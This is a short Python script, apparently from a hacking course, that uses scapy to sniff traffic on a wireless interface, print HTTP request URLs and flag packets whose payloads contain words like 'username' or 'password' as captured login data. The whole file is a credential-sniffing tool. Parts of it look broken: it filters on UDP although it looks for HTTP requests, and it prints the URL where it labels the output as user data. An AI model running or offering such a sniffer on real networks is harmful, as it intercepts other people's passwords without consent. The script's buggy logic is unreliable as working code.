#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="udp")


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "login", "password", "pass", "user"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    #print(packet.show())
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP request >>>" + url)

        login_info = get_login_info(packet)
        if login_info:
            print("[+] Possible user data >>>" + url)


sniff("wlan0")
